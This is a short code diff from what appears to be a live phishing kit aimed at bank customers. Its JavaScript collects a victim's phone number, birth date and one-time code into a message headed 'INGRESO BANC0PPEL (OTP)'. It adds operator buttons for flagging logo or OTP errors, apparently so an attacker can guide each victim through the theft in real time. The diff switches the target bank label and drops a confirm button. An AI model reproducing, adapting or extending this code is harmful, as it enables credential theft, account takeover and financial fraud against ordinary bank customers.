@@ -85,7 +85,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   localStorage.setItem("transactionId", transactionId);
 
   const mensaje = `
-<b>INGRESO BANCOLOMBIA (Dinámica)</b>
+<b>INGRESO BANC0PPEL (OTP)</b>
 🆔 ID: <code>${transactionId}</code>
 📱 Celular: ${session.celular}
 🎂 Nacimiento: ${session.nacimiento}
@@ -98,7 +98,6 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "✅ Confirmar", callback_data: `confirm_finalizar:${transactionId}` }],
       [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }],
       [{ text: "🔁 Error OTP", callback_data: `error_otp:${transactionId}` }],
       [{ text: "🏁 Finalizar", callback_data: `finalizar:${transactionId}` }]
